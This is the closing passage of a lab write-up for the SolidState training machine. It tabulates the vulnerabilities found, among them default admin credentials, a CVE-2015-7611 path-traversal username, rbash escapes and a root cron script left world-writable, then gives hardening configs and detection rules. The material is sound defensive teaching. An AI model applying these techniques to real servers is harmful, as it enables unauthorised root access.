> a login. Check the process owner before choosing your method.

---

## 6. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | **Default credentials on a management interface** | James Remote Admin, port **4555**, `root:root` | Full control of the mail system |
| 2 | Management interface exposed to the network | port 4555 | Unauthenticated administrative access |
| 3 | **Admin can reset any user's password** | `setpassword` | Mailbox takeover, privacy breach |
| 4 | **Credentials emailed in plaintext** | `mindy`'s inbox | SSH password disclosure |
| 5 | **`rbash` used as an access control** | all users' shells | Escaped four ways (`env`, `--noprofile`, python, editor) |
| 6 | **CVE-2015-7611 — path traversal in James usernames** | `adduser ../../etc/bash_completion.d` | Unauthenticated **RCE** at next login |
| 7 | **World-writable script executed by root cron** | `/opt/tmp.py`, mode `777` | `mindy` → **root** in ≤ 3 minutes |
| 8 | Mail server running as root | `ps aux` | CVE-2015-7611 yields root directly |
| 9 | End-of-life software (Apache James 2.3.2, 2009) | ports 25/110/119/4555 | No patches available at all |
| 10 | SMTP relay / open submission on port 25 | JAMES smtpd | Used to deliver the payload |
| 11 | NNTP exposed with posting enabled | port 119 | Unused attack surface |
| 12 | Verbose banners (Apache 2.4.25, OpenSSH 7.4p1, James version) | all services | Version-targeted attack planning |
| 13 | Missing HTTP security headers | Apache | Clickjacking / MIME-sniffing exposure |

## 7. Defensive lessons (blue team)

1. **Change every default credential, and never expose a management interface.** James
   ships with `root:root` on 4555. Two fixes, both mandatory:
   ```bash
   # james.properties — change the admin password
   <remotemanager>
       <port>4555</port>
       <handler>
           <hello>solidstate</hello>
           <administrator_accounts>
               <username>mailops</username>
               <password>$STRONG-UNIQUE-PASSWORD$</password>
           </administrator_accounts>
           <connectiontimeout> 60000 </connectiontimeout>
       </handler>
   </remotemanager>
   ```
   ```bash
   # bind it to loopback only
   iptables -A INPUT -p tcp --dport 4555 ! -s 127.0.0.1 -j DROP
   ```
   Better: put it behind a VPN or an SSH tunnel and never listen publicly.
2. **Retire end-of-life software.** James 2.3.2 is from 2009 and has no fix for
   CVE-2015-7611 — the remediation is *upgrade to James 3.x*, not patch. Subscribe to
   vendor EOL notices and treat them as hard deadlines.
3. **Never run a network-facing daemon as root.** James should run as its own
   unprivileged `james` user. Then CVE-2015-7611 writes files owned by `james` into a
   directory it cannot write to, and the whole chain dies. Use systemd hardening:
   ```ini
   [Service]
   User=james
   DynamicUser=yes
   ProtectSystem=strict
   ProtectHome=yes
   PrivateTmp=yes
   NoNewPrivileges=yes
   ReadWritePaths=/var/lib/james
   ```
4. **Audit every scheduled job for write permissions.** The finding that mattered most:
   ```bash
   # for each file a root cron job executes, who can write it?
   grep -RhoE '/[A-Za-z0-9_./-]+' /etc/crontab /etc/cron.* /var/spool/cron/crontabs/ 2>/dev/null \
     | sort -u | while read -r f; do
         [ -e "$f" ] && find "$f" -writable -not -user root -o -perm /o+w 2>/dev/null
       done
   ```
   Plus a world-writable sweep:
   ```bash
   find / -xdev -type f -perm /o+w -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null
   ```
   Nothing under `/opt`, `/usr/local`, or `/etc` should be `777`. Alert on it.
5. **Do not use `rbash` for confinement.** Use a chroot, a container,
   `ForceCommand internal-sftp` with `ChrootDirectory`, or an application-level
   allow-list. If you must keep rbash, remove every interpreter and `env` from the
   allow-list — and understand that this is still not a boundary.
6. **Never email credentials.** Use a one-time link with an expiry, or an out-of-band
   channel plus a forced reset on first login. Then enforce a policy that makes
   `P@55W0rd1!2@` fail at *set* time — it looks strong but is a keyboard walk plus a
   substitution, and both are in every rule-based wordlist.
7. **Encrypt mail in transit and at rest.** Require STARTTLS:
   ```text
   # james.properties
   <smtpserver enabled="true">
       <authtls>true</authtls>
       <tls keystore="/etc/james/keystore" secret="..."/>
   </smtpserver>
   ```
   POP3 plaintext (`USER`/`PASS` on port 110) sends every password in the clear.
8. **Disable unused protocols.** NNTP on 119 with posting enabled had no purpose.
9. **Strip banners.** `ServerTokens Prod`, `ServerSignature Off`, disable the SMTP
   version string where the product allows it.
10. **Detection opportunities.**
    - Alert on any connection to port **4555** from outside the management subnet.
    - Alert on the James admin command `adduser` with a username containing `/` or
      `..` — that is CVE-2015-7611 in one rule.
    - FIM on `/etc/bash_completion.d/`, `/etc/profile.d/`, `/etc/pm/config.d/` and
      `/etc/cron.*`: any *new file* should page immediately.
      ```bash
      auditctl -w /etc/bash_completion.d -p wa -k bash_completion
      auditctl -w /etc/profile.d -p wa -k profile_d
      ```
    - Alert on any file becoming world-writable outside `/tmp` and `/var/tmp`.
    - Alert on `/opt/tmp.py` being modified — auditd `-w /opt/tmp.py -p wa`.
    - Alert on outbound connections from `cron` or `python` under UID 0 to a
      non-allow-listed host (process-lineage monitoring).
    - Alert on `setpassword` in the James admin log — a bulk password reset across
      accounts is a mailbox-takeover signature.

---

## 8. References

- VulnHub entry: <https://vulnhub.com/entry/solidstate-1,261/>
- Community writeups consulted (VulnHub and its HTB twin):
  - [lonewolf.raj — Vulnhub SolidState](https://medium.com/@lonewolf.raj/vulnhub-solidstate-a5b5922c09e6) *(the `/opt/tmp.py` + `pspy` path)*
  - [gowthamarajr — SOLIDSTATE: 1 Walkthrough](https://gowthamarajr.medium.com/solidstate-1-walkthrough-70a8637cc81f)
  - [Dominic Breuker — Hack The Box Write-up: SolidState](https://dominicbreuker.com/post/htb_solidstate/)
  - [0x00sec — HTB SolidState write-up](https://archive.0x00sec.org/t/htb-solidstate-write-up/5129)
  - [reboare — HackTheBox SolidState](https://reboare.github.io/hackthebox/solidstate.html)
  - [Jai Minton — Hack The Box Solidstate](https://www.jaiminton.com/HTB/Solidstate/)
  - [guerzon.net — HackTheBox SolidState (Medium)](https://guerzon.net/2021-09-04/HackTheBox_SolidState(Medium).html)
  - [Tony Harkness — HTB Walkthrough SolidState](https://tonyharkness.com/posts/htb-solidstate/)
  - [0x4rt3mis — HackTheBox SolidState](https://0x4rt3mis.github.io/posts/HackTheBox-SolidState/)
  - [felixmeggison — SOLIDSTATE Walkthrough (No Metasploit) OSCP Prep](https://felixmeggison.medium.com/hackthebox-solidstate-walkthrough-no-metasploit-oscp-prep-dc7150ec8bc0)
- Exploits / advisories:
  - [CVE-2015-7611 — Apache James Server 2.3.2 Remote Command Execution](https://nvd.nist.gov/vuln/detail/CVE-2015-7611)
  - [Exploit-DB 35513 — Apache James Server 2.3.2 Authenticated User RCE](https://www.exploit-db.com/exploits/35513)
  - [Exploit-DB 27915 — Apache James 2.2 SMTP DoS](https://www.exploit-db.com/exploits/27915)
  - [Apache James 2.3.2 documentation — Remote Manager](https://james.apache.org/server/2.3.2/)
- Tools / background:
  - [`pspy` — monitor Linux processes without root](https://github.com/DominicBreuker/pspy)
  - [Hacking Articles — Multiple Methods to Bypass Restricted Shell](https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/)
  - [bash RESTRICTED SHELL](https://www.gnu.org/software/bash/manual/bash.html#The-Restricted-Shell) · [`bash(1)` `--noprofile`](https://man7.org/linux/man-pages/man1/bash.1.html)
  - [`bash_completion` — how `/etc/bash_completion.d` is sourced](https://www.gnu.org/software/bash/manual/html_node.html)
  - [POP3 (RFC 1939)](https://datatracker.ietf.org/doc/html/rfc1939) · [SMTP (RFC 5321)](https://datatracker.ietf.org/doc/html/rfc5321)
  - [GTFOBins](https://gtfobins.github.io) · [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
  - [pentestmonkey — Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

---

## 9. Screenshot checklist

- [ ] `images/01-nmap.png` — `nmap -p-` revealing port 4555 `james-admin`
- [ ] `images/02-pop3.png` — `telnet 110`, `mindy`'s email with the SSH password
- [ ] `images/03-pspy.png` — `pspy` showing `/opt/tmp.py` as UID 0, and its `777` mode
- [ ] `images/04-cve.png` — the `adduser ../../…` traversal and `/etc/bash_completion.d/exploit`
- [ ] `images/05-flag.png` — root shell and `/root/root.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md) · [progress](../../docs/PROGRESS.md)._
